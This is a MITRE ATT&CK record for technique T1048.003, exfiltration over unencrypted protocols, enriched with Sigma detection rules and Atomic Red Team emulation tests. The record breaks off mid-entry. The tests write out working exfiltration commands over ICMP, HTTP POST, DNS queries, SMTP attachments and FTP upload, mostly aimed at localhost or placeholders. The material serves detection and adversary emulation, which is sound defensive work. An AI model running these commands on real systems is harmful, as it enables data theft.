{
    "id": "T1048.003",
    "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Exfiltration",
    "data_sources": "Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content, File: File Access, Command: Command Execution",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1048/003",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "44ae5117-9c44-40cf-9c7c-7edad385ca70",
                    "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
                    "51186749-7415-46be-90e5-6914865c825a",
                    "fb8d023d-45be-47e9-bc51-f56bcae6435b",
                    "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
                    "4153a907-2451-4e4f-a578-c52bb6881432",
                    "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
                    "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
                    "cb39d16b-b3b6-4a7a-8222-1cf24b686ffc",
                    "705072a5-bb6f-4ced-95b6-ecfa6602090b",
                    "4c4af3cd-2115-479c-8193-6b8bfce9001c",
                    "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
                    "9976fa64-2804-423c-8a5b-646ade840773",
                    "3b6e327d-8649-4102-993f-d25786481589",
                    "9a7afa56-4762-43eb-807d-c3dc9ffe211b"
                ],
                "lookup_results": [
                    {
                        "uuid": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
                        "lookup_data": {
                            "description": "Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of NULL record type DNS requests from host per short\n  period of time. Possible result of iodine tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: 'NULL'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS NULL requests rate to domain name which should be added to whitelist\nid: 44ae5117-9c44-40cf-9c7c-7edad385ca70\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High NULL Records Requests Rate\n",
                            "sigma:id": "44ae5117-9c44-40cf-9c7c-7edad385ca70",
                            "title": "High NULL Records Requests Rate",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
                        "lookup_data": {
                            "description": "A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\n",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: 'A General detection for svchost.exe spawning rundll32.exe with command\n  arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\n\n  This could be an indicator of exfiltration or use of WebDav to launch code (hosted\n  on WebDav Server).\n\n  '\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains: C:\\windows\\system32\\davclnt.dll,DavSetCookie\n  selection_img:\n  - Image|endswith: \\rundll32.exe\n  - OriginalFileName: RUNDLL32.EXE\nfalsepositives:\n- Unknown\nid: 2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/17\n- https://threathunterplaybook.com/evals/apt29/detections/7.B.4_C10730EA-6345-4934-AA0F-B0EFCA0C4BA6.html\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: Suspicious WebDav Client Execution\n",
                            "sigma:id": "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
                            "title": "Suspicious WebDav Client Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "51186749-7415-46be-90e5-6914865c825a",
                        "lookup_data": {
                            "description": "High DNS requests amount from host per short period of time",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS requests amount from host per short period of time\ndetection:\n  condition: selection | count() by src_ip > 1000\n  selection:\n    dst_port: 53\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS requests rate to domain name which should be added to whitelist\nid: 51186749-7415-46be-90e5-6914865c825a\nlevel: medium\nlogsource:\n  category: firewall\nmodified: 2022/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High DNS Requests Rate - Firewall\n",
                            "sigma:id": "51186749-7415-46be-90e5-6914865c825a",
                            "title": "High DNS Requests Rate - Firewall",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fb8d023d-45be-47e9-bc51-f56bcae6435b",
                        "lookup_data": {
                            "mitre-attack-id": "T1048.003",
                            "mitre-cti:description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
                            "mitre-cti:name": "Exfiltration Over Unencrypted Non-C2 Protocol",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['William Cain'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b', 'created': '2020-03-15T15:37:47.583Z', 'x_mitre_version': '2.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003'}, {'source_name': 'University of Birmingham C2', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \\n\\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ', 'modified': '2022-04-12T19:57:45.277Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Exfiltration Over Unencrypted Non-C2 Protocol', 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['File: File Access', 'Network Traffic: Network Traffic Content', 'Command: Command Execution', 'Network Traffic: Network Traffic Flow', 'Network Traffic: Network Connection Creation'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
                        "lookup_data": {
                            "description": "Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.",
                            "raw": "author: Patrick Bareiss\ndate: 2019/04/07\ndescription: Normally, DNS logs contain a limited amount of different dns queries\n  for a single domain. This rule detects a high amount of queries for a single domain,\n  which can be an indicator that DNS is used to transfer data.\ndetection:\n  condition: selection | count(dns_query) by parent_domain > 1000\n  selection:\n    parent_domain: '*'\nfalsepositives:\n- Valid software, which uses dns for transferring data\nid: 1ec4b281-aa65-46a2-bdae-5fd830ed914e\nlevel: high\nlogsource:\n  category: dns\nmodified: 2021/11/27\nreferences:\n- https://zeltser.com/c2-dns-tunneling/\n- https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1071.004\n- attack.exfiltration\n- attack.t1048.003\ntitle: Possible DNS Tunneling\n",
                            "sigma:id": "1ec4b281-aa65-46a2-bdae-5fd830ed914e",
                            "title": "Possible DNS Tunneling",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4153a907-2451-4e4f-a578-c52bb6881432",
                        "lookup_data": {
                            "description": "Detects suspicious DNS queries using base64 encoding",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/05/10\ndescription: Detects suspicious DNS queries using base64 encoding\ndetection:\n  condition: selection\n  selection:\n    query|contains: ==.\nfalsepositives:\n- Unknown\nid: 4153a907-2451-4e4f-a578-c52bb6881432\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nreferences:\n- https://github.com/krmaxwell/dns-exfiltration\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: Suspicious DNS Query with B64 Encoded String\n",
                            "sigma:id": "4153a907-2451-4e4f-a578-c52bb6881432",
                            "title": "Suspicious DNS Query with B64 Encoded String",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
                        "lookup_data": {
                            "description": "High DNS requests amount from host per short period of time",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS requests amount from host per short period of time\ndetection:\n  condition: selection | count() by src_ip > 1000\n  selection:\n    query: '*'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS requests rate to domain name which should be added to whitelist\nid: b4163085-4001-46a3-a79a-55d8bbbc7a3a\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High DNS Requests Rate\n",
                            "sigma:id": "b4163085-4001-46a3-a79a-55d8bbbc7a3a",
                            "title": "High DNS Requests Rate",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
                        "lookup_data": {
                            "description": "High DNS queries bytes amount from host per short period of time",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS queries bytes amount from host per short period of time\ndetection:\n  condition: selection | sum(question_length) by src_ip > 300000\n  selection:\n    query: '*'\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS bytes out rate to domain name which should be added to whitelist\nid: 0f6c1bf5-70a5-4963-aef9-aab1eefb50bd\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: High DNS Bytes Out\n",
                            "sigma:id": "0f6c1bf5-70a5-4963-aef9-aab1eefb50bd",
                            "title": "High DNS Bytes Out",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cb39d16b-b3b6-4a7a-8222-1cf24b686ffc",
                        "lookup_data": {
                            "description": "Detects attempts to post the file with the usage of wget utility.\nThe adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\n",
                            "raw": "author: Pawel Mazur\ndate: 2021/11/18\ndescription: 'Detects attempts to post the file with the usage of wget utility.\n\n  The adversary can bypass the permission restriction with the misconfigured sudo\n  permission for wget utility which could allow them to read files like /etc/shadow.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    a0: wget\n    a1|startswith: --post-file=\n    type: EXECVE\nfalsepositives:\n- Legitimate usage of wget utility to post a file\nid: cb39d16b-b3b6-4a7a-8222-1cf24b686ffc\nlevel: medium\nlogsource:\n  product: linux\n  service: auditd\nmodified: 2022/12/25\nreferences:\n- https://linux.die.net/man/1/wget\n- https://gtfobins.github.io/gtfobins/wget/\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: Data Exfiltration with Wget\n",
                            "sigma:id": "cb39d16b-b3b6-4a7a-8222-1cf24b686ffc",
                            "title": "Data Exfiltration with Wget",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "705072a5-bb6f-4ced-95b6-ecfa6602090b",
                        "lookup_data": {
                            "description": "A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection for WebDav user-agent being used to PUT files on\n  a WebDav network share. This could be an indicator of exfiltration.\ndetection:\n  condition: selection and not filter\n  filter:\n    id.resp_h:\n    - 192.168.0.0/16\n    - 172.16.0.0/12\n    - 10.0.0.0/8\n  selection:\n    method: PUT\n    user_agent|contains: WebDAV\nfalsepositives:\n- Unknown\nid: 705072a5-bb6f-4ced-95b6-ecfa6602090b\nlevel: low\nlogsource:\n  product: zeek\n  service: http\nmodified: 2021/11/27\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/17\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: WebDav Put Request\n",
                            "sigma:id": "705072a5-bb6f-4ced-95b6-ecfa6602090b",
                            "title": "WebDav Put Request",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4c4af3cd-2115-479c-8193-6b8bfce9001c",
                        "lookup_data": {
                            "description": "Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.",
                            "raw": "author: Bartlomiej Czyz @bczyz1, oscd.community\ndate: 2020/10/10\ndescription: Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may\n  steal data by exfiltrating it over an un-encrypted network protocol other than that\n  of the existing command and control channel.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - New-Object\n    - System.Net.NetworkInformation.Ping\n    - .Send(\nfalsepositives:\n- Legitimate usage of System.Net.NetworkInformation.Ping class\nid: 4c4af3cd-2115-479c-8193-6b8bfce9001c\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-2---exfiltration-over-alternative-protocol---icmp\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: PowerShell ICMP Exfiltration\n",
                            "sigma:id": "4c4af3cd-2115-479c-8193-6b8bfce9001c",
                            "title": "PowerShell ICMP Exfiltration",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
                        "lookup_data": {
                            "description": "Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: Extremely high rate of TXT record type DNS requests from host per short\n  period of time. Possible result of Do-exfiltration tool execution\ndetection:\n  condition: selection | count() by src_ip > 50\n  selection:\n    record_type: TXT\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS TXT requests rate to domain name which should be added to whitelist\nid: f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35\nlevel: medium\nlogsource:\n  category: dns\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\n- attack.command_and_control\n- attack.t1071.004\ntitle: High TXT Records Requests Rate\n",
                            "sigma:id": "f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35",
                            "title": "High TXT Records Requests Rate",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9976fa64-2804-423c-8a5b-646ade840773",
                        "lookup_data": {
                            "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server.\n",
                            "raw": "author: frack113\ndate: 2022/01/07\ndescription: 'Adversaries may steal data by exfiltrating it over an un-encrypted network\n  protocol other than that of the existing command and control channel.\n\n  The data may also be sent to an alternate network location from the main command\n  and control server.\n\n  '\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_clients:\n    Image|endswith:\n    - \\thunderbird.exe\n    - \\outlook.exe\n  filter_mailserver:\n    Image|startswith: C:\\Program Files\\Microsoft\\Exchange Server\\\n  filter_outlook:\n    Image|endswith: \\HxTsr.exe\n    Image|startswith: C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_\n  selection:\n    DestinationPort:\n    - 25\n    - 587\n    - 465\n    - 2525\n    Initiated: 'true'\nfalsepositives:\n- Other SMTP tools\nid: 9976fa64-2804-423c-8a5b-646ade840773\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp\n- https://www.ietf.org/rfc/rfc2821.txt\nstatus: experimental\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: Suspicious Outbound SMTP Connections\n",
                            "sigma:id": "9976fa64-2804-423c-8a5b-646ade840773",
                            "title": "Suspicious Outbound SMTP Connections",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3b6e327d-8649-4102-993f-d25786481589",
                        "lookup_data": {
                            "description": "High DNS queries bytes amount from host per short period of time",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/24\ndescription: High DNS queries bytes amount from host per short period of time\ndetection:\n  condition: selection | sum(message_size) by src_ip > 300000\n  selection:\n    dst_port: 53\n  timeframe: 1m\nfalsepositives:\n- Legitimate high DNS bytes out rate to domain name which should be added to whitelist\nid: 3b6e327d-8649-4102-993f-d25786481589\nlevel: medium\nlogsource:\n  category: firewall\nmodified: 2022/11/27\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: High DNS Bytes Out - Firewall\n",
                            "sigma:id": "3b6e327d-8649-4102-993f-d25786481589",
                            "title": "High DNS Bytes Out - Firewall",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9a7afa56-4762-43eb-807d-c3dc9ffe211b",
                        "lookup_data": {
                            "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server.\n",
                            "raw": "author: frack113\ndate: 2022/09/26\ndescription: 'Adversaries may steal data by exfiltrating it over an un-encrypted network\n  protocol other than that of the existing command and control channel.\n\n  The data may also be sent to an alternate network location from the main command\n  and control server.\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    ScriptBlockText|contains: CmdletsToExport\n  selection:\n    ScriptBlockText|contains: Send-MailMessage\nfalsepositives:\n- Legitimate script\nid: 9a7afa56-4762-43eb-807d-c3dc9ffe211b\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2\n- https://www.ietf.org/rfc/rfc2821.txt\nstatus: experimental\ntags:\n- attack.exfiltration\n- attack.t1048.003\ntitle: Powershell Exfiltration Over SMTP\n",
                            "sigma:id": "9a7afa56-4762-43eb-807d-c3dc9ffe211b",
                            "title": "Powershell Exfiltration Over SMTP",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1048.003",
                "display_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                "atomic_tests": [
                    {
                        "name": "Exfiltration Over Alternative Protocol - HTTP",
                        "auto_generated_guid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff",
                        "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n",
                        "supported_platforms": [
                            "macos",
                            "linux"
                        ],
                        "executor": {
                            "steps": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n",
                            "name": "manual"
                        }
                    },
                    {
                        "name": "Exfiltration Over Alternative Protocol - ICMP",
                        "auto_generated_guid": "dd4b4421-2e25-4593-90ae-7021947ad12e",
                        "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "input_file": {
                                "description": "Path to file to be exfiltrated.",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\notepad.exe"
                            },
                            "ip_address": {
                                "description": "Destination IP address where the data should be sent.",
                                "type": "string",
                                "default": "127.0.0.1"
                            }
                        },
                        "executor": {
                            "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Exfiltration Over Alternative Protocol - DNS",
                        "auto_generated_guid": "c403b5a4-b5fc-49f2-b181-d1c80d27db45",
                        "description": "Exfiltration of specified file over DNS protocol.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "steps": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n",
                            "name": "manual"
                        }
                    },
                    {
                        "name": "Exfiltration Over Alternative Protocol - HTTP",
                        "auto_generated_guid": "6aa58451-1121-4490-a8e9-1dada3f1c68c",
                        "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n",
                            "name": "powershell"
                        },
                        "input_arguments": {
                            "input_file": {
                                "description": "Path to file to exfiltrate",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\notepad.exe"
                            },
                            "ip_address": {
                                "description": "Destination IP address where the data should be sent",
                                "type": "string",
                                "default": "http://127.0.0.1"
                            }
                        }
                    },
                    {
                        "name": "Exfiltration Over Alternative Protocol - SMTP",
                        "auto_generated_guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9",
                        "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n",
                            "name": "powershell"
                        },
                        "input_arguments": {
                            "input_file": {
                                "description": "Path to file to exfiltrate",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\notepad.exe"
                            },
                            "sender": {
                                "description": "The email address of the sender",
                                "type": "string",
                                "default": "test@corp.com"
                            },
                            "receiver": {
                                "description": "The email address of the receiver",
                                "type": "string",
                                "default": "test@corp.com"
                            },
                            "smtp_server": {
                                "description": "SMTP server to use for email transportation",
                                "type": "string",
                                "default": "127.0.0.1"
                            }
                        }
                    },
                    {
                        "name": "MAZE FTP Upload",
                        "auto_generated_guid": "57799bc2-ad1e-4130-a793-fb0c385130ba",
                        "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ftp_server": {
                                "description": "FTP Server address",
                                "type": "string",
                                "default": "127.0.0.1"
                            },
                            "username": {
                                "description": "Username for FTP server login",
                                "type": "string",
                                "default": null
                            },
                            "password": {
                                "description": "Password for FTP server login",
                                "type": "string",
                                "default": null
                            }
                        },
                        "executor": {
                            "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
                            "cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
                        "auto_generated_guid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
                        "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ftp_server": {
                                "description": "Your own ftp server",
                                "type": "string",
                                "default": "ftp.dlptest.com"
                            },
                            "ftp_pass": {
                                "description": "Your FTP user's password",
                                "type": "string",
                                "default": "rNrKYTX9g7z3RgJRmxWuGHbeu"
                            },
                            "ftp_user": {
                                "description": "Your FTP username",
                                "type": "string",
                                "default": "dlpuser"
                            },
                            "ftp_port": {
                                "description": "Your FTP's port",
                                "type": "integer",
                                "default": 21
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Check if the exfil package exists\n",
                                "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"
                            },
                            {
                                "description": "Check if rclone zip exists",
                                "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"
                            }
                        ],
                        "executor": {
